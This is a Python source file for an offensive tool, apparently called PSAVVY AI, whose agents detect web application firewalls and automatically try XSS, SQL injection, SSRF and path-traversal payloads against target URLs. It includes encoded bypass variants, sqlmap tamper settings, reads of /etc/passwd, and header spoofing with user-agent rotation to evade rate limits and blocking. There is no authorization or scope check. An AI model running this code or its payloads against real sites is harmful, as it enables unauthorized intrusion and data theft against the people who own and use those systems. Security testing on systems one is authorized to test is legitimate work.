"""
PSAVVY AI - WAF Bypass Integrated Specialized Agents
Enhanced agents with automatic WAF detection and bypass

Each agent automatically:
1. Detects WAF presence
2. Generates bypass payloads
3. Tests with evasion techniques
4. Adapts based on blocking patterns
"""

import subprocess
import os
import json
import time
import re
from typing import Dict, List, Any, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import WAF bypass engine
from waf_bypass import (
    WAFDetector, WAFBypassEngine, PayloadEncoder, RateLimitBypass,
    WAFType, BypassTechnique, WAFInfo, BypassPayload
)

# Import base classes
from specialized_agents import (
    BaseSpecializedAgent, Finding, VulnSeverity, AgentStatus
)

try:
    from ai_engine import AIProviderManager
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False


class BypassAwareAgent(BaseSpecializedAgent):
    """
    Enhanced base agent with WAF bypass capabilities
    """

    def __init__(self, ai_manager: AIProviderManager, name: str, output_dir: str = "output"):
        super().__init__(ai_manager, name, output_dir)
        self.bypass_engine = WAFBypassEngine(ai_manager)
        self.waf_detector = WAFDetector()
        self.encoder = PayloadEncoder()
        self.rate_limit = RateLimitBypass()
        self.detected_wafs: Dict[str, WAFInfo] = {}

    def detect_waf_for_target(self, target: str) -> WAFInfo:
        """Detect and cache WAF information"""
        if target in self.detected_wafs:
            return self.detected_wafs[target]

        self.log(f"Detecting WAF for {target}...")
        waf_info = self.waf_detector.detect_waf(target)

        if waf_info.waf_type != WAFType.UNKNOWN:
            self.log(f"WAF detected: {waf_info.waf_type.value} (confidence: {waf_info.confidence}%)")
        else:
            self.log("No WAF detected or unknown WAF")

        self.detected_wafs[target] = waf_info
        return waf_info

    def test_with_bypass(self, target: str, original_payload: str,
                        vuln_type: str) -> Tuple[bool, str, BypassPayload]:
        """
        Test payload with automatic bypass generation
        Returns: (success, evidence, bypass_used)
        """

        # First try original payload
        self.log(f"Testing original payload...")
        success, evidence = self._test_payload(target, original_payload)

        if success:
            self.log("Original payload successful!")
            return True, evidence, None

        # Detect WAF
        waf_info = self.detect_waf_for_target(target)

        # Generate bypass payloads
        self.log(f"Original blocked. Generating {vuln_type} bypass payloads...")
        bypass_payloads = self.bypass_engine.generate_bypass_payloads(
            original_payload, target, vuln_type
        )

        # Sort by success rate
        bypass_payloads.sort(key=lambda x: x.success_rate, reverse=True)

        # Try each bypass
        for i, bypass_payload in enumerate(bypass_payloads[:10], 1):  # Try top 10
            self.log(f"Bypass attempt {i}/10: {bypass_payload.description} (success rate: {bypass_payload.success_rate}%)")

            success, evidence = self._test_payload(target, bypass_payload.bypassed)

            if success:
                self.log(f"SUCCESS! Bypass technique worked: {bypass_payload.technique.value}")
                return True, evidence, bypass_payload

            time.sleep(1)  # Rate limit delay

        self.log("All bypass attempts failed")
        return False, "", None

    def _test_payload(self, target: str, payload: str) -> Tuple[bool, str]:
        """
        Test a single payload against target
        Override in subclass for specific testing logic
        """
        # Default implementation - override in subclass
        return False, ""

    def execute_with_evasion(self, command: str, use_rotation: bool = True) -> Tuple[str, int]:
        """Execute command with user agent rotation and IP spoofing"""

        if use_rotation:
            # Add random user agent
            user_agents = self.rate_limit.generate_user_agents()
            user_agent = user_agents[hash(command) % len(user_agents)]

            # Add X-Forwarded-For
            xff_ips = self.rate_limit.generate_x_forwarded_for()
            xff = xff_ips[hash(command) % len(xff_ips)]

            # Modify command to include headers
            if 'curl' in command:
                command = command.replace('curl ', f'curl -H "User-Agent: {user_agent}" -H "X-Forwarded-For: {xff}" ')

        return self.execute_tool(command)


class XSSBypassAgent(BypassAwareAgent):
    """XSS Agent with WAF bypass capabilities"""

    def __init__(self, ai_manager: AIProviderManager, output_dir: str = "output"):
        super().__init__(ai_manager, "XSSBypassAgent", output_dir)

    def scan(self, targets: List[str], parameters: Dict[str, Any]) -> List[Finding]:
        self.log(f"Starting WAF-aware XSS scan on {len(targets)} targets")
        findings = []

        # Test each target with bypass capabilities
        for target in targets[:50]:  # Limit for performance
            # Basic XSS payloads
            xss_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>"
            ]

            for payload in xss_payloads:
                # Detect WAF and try bypass
                success, evidence, bypass_used = self.test_with_bypass(
                    target, payload, "xss"
                )

                if success:
                    finding = Finding(
                        vuln_type="XSS (WAF Bypassed)",
                        target=target,
                        severity=VulnSeverity.HIGH,
                        evidence=evidence[:1000],
                        poc=bypass_used.bypassed if bypass_used else payload,
                        confidence=90 if bypass_used else 85
                    )

                    if bypass_used:
                        finding.impact = f"XSS bypassed {bypass_used.waf_target.value} using {bypass_used.technique.value}"

                    self.save_finding(finding)
                    findings.append(finding)
                    break  # Move to next target

        # Also run dalfox with bypass techniques
        self.log("Running dalfox with bypass mode...")
        for target in targets[:100]:
            output, _ = self.execute_with_evasion(
                f"echo '{target}' | dalfox pipe --silence --bypass-all 2>/dev/null",
                use_rotation=True
            )

            if "POC" in output or "Vulnerable" in output.lower():
                finding = Finding(
                    vuln_type="XSS (Dalfox)",
                    target=target,
                    severity=VulnSeverity.HIGH,
                    evidence=output[:1000],
                    confidence=85
                )
                self.save_finding(finding)
                findings.append(finding)

        self.log(f"XSS bypass scan complete: {len(findings)} findings")
        return findings

    def _test_payload(self, target: str, payload: str) -> Tuple[bool, str]:
        """Test XSS payload"""
        test_url = f"{target}?xss={payload}" if '?' not in target else f"{target}&xss={payload}"

        output, code = self.execute_with_evasion(
            f"curl -s '{test_url}' 2>/dev/null | grep -i '{payload[:20]}'"
        )

        # Check if payload is reflected
        if payload[:20] in output or payload.replace('<', '&lt;') in output:
            return True, f"XSS payload reflected: {output[:200]}"

        return False, ""


class SQLiBypassAgent(BypassAwareAgent):
    """SQL Injection Agent with WAF bypass"""

    def __init__(self, ai_manager: AIProviderManager, output_dir: str = "output"):
        super().__init__(ai_manager, "SQLiBypassAgent", output_dir)

    def scan(self, targets: List[str], parameters: Dict[str, Any]) -> List[Finding]:
        self.log(f"Starting WAF-aware SQLi scan on {len(targets)} targets")
        findings = []

        # Extract SQLi candidates
        sqli_urls_file = os.path.join(self.output_dir, "sqli_urls.txt")
        all_urls = os.path.join(self.output_dir, "all_target_urls.txt")

        if os.path.exists(all_urls):
            self.execute_tool(f"cat {all_urls} | gf sqli > {sqli_urls_file} 2>/dev/null")

        if not os.path.exists(sqli_urls_file):
            self.log("No SQLi candidates found")
            return findings

        # Read SQLi URLs
        with open(sqli_urls_file, 'r') as f:
            sqli_urls = [line.strip() for line in f if line.strip()][:50]

        # Test each URL with bypass
        for url in sqli_urls:
            # Detect WAF
            waf_info = self.detect_waf_for_target(url)

            # SQLi payloads
            sqli_payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "1' AND 1=1--"
            ]

            for payload in sqli_payloads:
                success, evidence, bypass_used = self.test_with_bypass(
                    url, payload, "sqli"
                )

                if success:
                    finding = Finding(
                        vuln_type=f"SQL Injection (Bypassed {waf_info.waf_type.value})",
                        target=url,
                        severity=VulnSeverity.CRITICAL,
                        evidence=evidence,
                        poc=bypass_used.bypassed if bypass_used else payload,
                        confidence=95 if bypass_used else 85
                    )

                    if bypass_used:
                        finding.impact = f"SQLi bypassed using {bypass_used.description}"

                    self.save_finding(finding)
                    findings.append(finding)
                    break

        # Also run sqlmap with tamper scripts (built-in bypass)
        self.log("Running sqlmap with tamper scripts...")
        output, _ = self.execute_with_evasion(
            f"python3 Tools/sqlmap/sqlmap.py -m '{sqli_urls_file}' "
            f"--batch --level=2 --risk=2 --smart "
            f"--tamper=between,randomcase,space2comment,charencode "
            f"--random-agent 2>/dev/null | head -300",
            use_rotation=False  # sqlmap has its own randomization
        )

        if "vulnerable" in output.lower():
            self.log("sqlmap found vulnerabilities with tamper scripts")
            # Parse and save findings

        self.log(f"SQLi bypass scan complete: {len(findings)} findings")
        return findings

    def _test_payload(self, target: str, payload: str) -> Tuple[bool, str]:
        """Test SQL injection payload"""
        test_url = f"{target}{payload}" if '=' in target else f"{target}?id={payload}"

        output, code = self.execute_with_evasion(
            f"curl -s '{test_url}' 2>/dev/null"
        )

        # Check for SQL errors
        sql_errors = ['mysql', 'syntax error', 'postgresql', 'oracle', 'mssql', 'sqlite']
        for error in sql_errors:
            if error in output.lower():
                return True, f"SQL error detected: {output[:300]}"

        return False, ""


class SSRFBypassAgent(BypassAwareAgent):
    """SSRF Agent with protocol smuggling and bypass"""

    def __init__(self, ai_manager: AIProviderManager, output_dir: str = "output"):
        super().__init__(ai_manager, "SSRFBypassAgent", output_dir)

    def scan(self, targets: List[str], parameters: Dict[str, Any]) -> List[Finding]:
        self.log(f"Starting WAF-aware SSRF scan")
        findings = []

        callback_url = parameters.get('BURP_COLLAB_URL', 'http://interact.sh')

        # SSRF bypass payloads
        ssrf_bypasses = [
            callback_url,
            callback_url.replace('http://', 'http://127.0.0.1@'),
            callback_url.replace('http://', 'http://0x7f000001/'),  # Hex encoding
            f"http://[::ffff:127.0.0.1]",  # IPv6
            callback_url.replace('.', '[.]'),  # Dot bypass
        ]

        all_urls = os.path.join(self.output_dir, "all_target_urls.txt")
        if os.path.exists(all_urls):
            with open(all_urls, 'r') as f:
                test_urls = [line.strip() for line in f if line.strip()][:30]

            for url in test_urls:
                if 'url=' in url or 'target=' in url or 'fetch=' in url:
                    for bypass_payload in ssrf_bypasses:
                        waf_info = self.detect_waf_for_target(url)

                        # Replace with bypass payload
                        test_url = re.sub(r'(url|target|fetch)=[^&]*', f'\\1={bypass_payload}', url)

                        output, code = self.execute_with_evasion(
                            f"curl -s -o /dev/null -w '%{{http_code}}' '{test_url}' 2>/dev/null"
                        )

                        if output.strip() in ["200", "301", "302"]:
                            finding = Finding(
                                vuln_type=f"SSRF (Bypassed {waf_info.waf_type.value})",
                                target=url,
                                severity=VulnSeverity.HIGH,
                                evidence=f"Response code: {output}, Bypass payload: {bypass_payload}",
                                poc=test_url,
                                confidence=80
                            )
                            self.save_finding(finding)
                            findings.append(finding)
                            break

        self.log(f"SSRF bypass scan complete: {len(findings)} findings")
        return findings


class LFIBypassAgent(BypassAwareAgent):
    """LFI Agent with path traversal bypass"""

    def __init__(self, ai_manager: AIProviderManager, output_dir: str = "output"):
        super().__init__(ai_manager, "LFIBypassAgent", output_dir)

    def scan(self, targets: List[str], parameters: Dict[str, Any]) -> List[Finding]:
        self.log(f"Starting WAF-aware LFI scan")
        findings = []

        # Advanced LFI bypass payloads
        lfi_bypasses = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoding
            "....//....//....//etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # UTF-8 overlong
            "..\\..\\..\\etc\\passwd",  # Windows-style
            "../../../etc/passwd%00",  # Null byte
            "....\\\\....\\\\....\\\\etc\\passwd",  # Weird separators
        ]

        all_urls = os.path.join(self.output_dir, "all_target_urls.txt")
        if os.path.exists(all_urls):
            with open(all_urls, 'r') as f:
                test_urls = [line.strip() for line in f if 'file=' in line or 'path=' in line or 'page=' in line][:30]

            for url in test_urls:
                waf_info = self.detect_waf_for_target(url)

                for lfi_payload in lfi_bypasses:
                    # Replace parameter value
                    test_url = re.sub(r'(file|path|page)=[^&]*', f'\\1={lfi_payload}', url)

                    output, code = self.execute_with_evasion(
                        f"curl -s '{test_url}' 2>/dev/null | head -20"
                    )

                    # Check for /etc/passwd content
                    if "root:" in output or "bin/bash" in output or "nologin" in output:
                        finding = Finding(
                            vuln_type=f"LFI (Bypassed {waf_info.waf_type.value})",
                            target=url,
                            severity=VulnSeverity.HIGH,
                            evidence=output[:500],
                            poc=f"curl '{test_url}'",
                            confidence=90
                        )
                        finding.impact = f"LFI bypassed using: {lfi_payload}"
                        self.save_finding(finding)
                        findings.append(finding)
                        break

        self.log(f"LFI bypass scan complete: {len(findings)} findings")
        return findings


class BypassOrchestrator:
    """
    Orchestrator for WAF-aware bypass agents
    """

    def __init__(self, ai_manager: AIProviderManager, output_dir: str = "output"):
        self.ai_manager = ai_manager
        self.output_dir = output_dir
        self.all_findings: List[Finding] = []

        # Initialize bypass-aware agents
        self.agents = [
            XSSBypassAgent(ai_manager, output_dir),
            SQLiBypassAgent(ai_manager, output_dir),
            SSRFBypassAgent(ai_manager, output_dir),
            LFIBypassAgent(ai_manager, output_dir),
        ]

    def log(self, message: str):
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] [BypassOrchestrator] {message}")

    def run_bypass_scan(self, target: str, config: Dict = None, max_workers: int = 4) -> Dict[str, Any]:
        """Run WAF-aware bypass scan"""

        self.log(f"Starting WAF bypass scan on {target}")
        self.log("=" * 80)

        start_time = time.time()
        config = config or {}

        # Collect targets
        targets = self._collect_targets()
        parameters = config.copy()

        # Run agents in parallel
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_agent = {
                executor.submit(agent.scan, targets, parameters): agent
                for agent in self.agents
            }

            for future in as_completed(future_to_agent):
                agent = future_to_agent[future]
                try:
                    findings = future.result()
                    self.all_findings.extend(findings)
                    self.log(f"✓ {agent.name} completed: {len(findings)} findings")
                except Exception as e:
                    self.log(f"✗ {agent.name} failed: {str(e)}")

        # Generate report
        results = {
            "target": target,
            "total_findings": len(self.all_findings),
            "bypassed_wafs": self._get_bypassed_wafs(),
            "findings": [self._finding_to_dict(f) for f in self.all_findings],
            "duration": time.time() - start_time
        }

        # Save report
        report_file = os.path.join(self.output_dir, "waf_bypass_report.json")
        with open(report_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)

        self.log("=" * 80)
        self.log(f"WAF bypass scan complete: {len(self.all_findings)} findings")
        self.log(f"Report saved to: {report_file}")

        return results

    def _collect_targets(self) -> List[str]:
        """Collect targets from output files"""
        targets = []
        for filename in ["filterDNS.txt", "all_target_urls.txt"]:
            filepath = os.path.join(self.output_dir, filename)
            if os.path.exists(filepath):
                with open(filepath, 'r') as f:
                    targets.extend([line.strip() for line in f if line.strip()])
        return list(set(targets))

    def _get_bypassed_wafs(self) -> Dict[str, int]:
        """Get statistics on bypassed WAFs"""
        bypassed = {}
        for finding in self.all_findings:
            if "Bypassed" in finding.vuln_type:
                waf = finding.vuln_type.split("Bypassed ")[1].rstrip(")")
                bypassed[waf] = bypassed.get(waf, 0) + 1
        return bypassed

    def _finding_to_dict(self, finding: Finding) -> Dict:
        return {
            "vuln_type": finding.vuln_type,
            "target": finding.target,
            "severity": finding.severity.value,
            "evidence": finding.evidence[:300],
            "poc": finding.poc,
            "confidence": finding.confidence,
            "impact": finding.impact
        }


def run_waf_bypass_scan(target: str, config_path: str = "config.yaml", max_workers: int = 4):
    """Main function to run WAF bypass scan"""

    # Load config
    config = {}
    if os.path.exists(config_path):
        try:
            import yaml
            with open(config_path) as f:
                config = yaml.safe_load(f) or {}
        except:
            with open(config_path) as f:
                for line in f:
                    if '=' in line and not line.startswith('#'):
                        key, value = line.strip().split('=', 1)
                        config[key] = value

    # Initialize AI
    ai_manager = AIProviderManager(config)

    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║     PSAVVY AI - WAF BYPASS EXPLOITATION SYSTEM               ║
    ║     Advanced Evasion & Security Control Bypass               ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

    # Run scan
    orchestrator = BypassOrchestrator(ai_manager, "output")
    results = orchestrator.run_bypass_scan(target, config, max_workers)

    # Print summary
    print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                  WAF BYPASS SUMMARY                          ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  Total Findings:     {results['total_findings']:3d}                                 ║
    ║  Duration:           {results['duration']:6.1f}s                             ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

    if results.get("bypassed_wafs"):
        print("\n    WAFs Bypassed:")
        for waf, count in results["bypassed_wafs"].items():
            print(f"      • {waf}: {count} times")

    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 bypass_integrated_agents.py <target> [config] [workers]")
        print("\nExample:")
        print("  python3 bypass_integrated_agents.py example.com")
        print("\nNote: Run reconnaissance first to populate output/ folder")
        sys.exit(1)

    target = sys.argv[1]
    config_path = sys.argv[2] if len(sys.argv) > 2 else "config.yaml"
    max_workers = int(sys.argv[3]) if len(sys.argv) > 3 else 4

    run_waf_bypass_scan(target, config_path, max_workers)
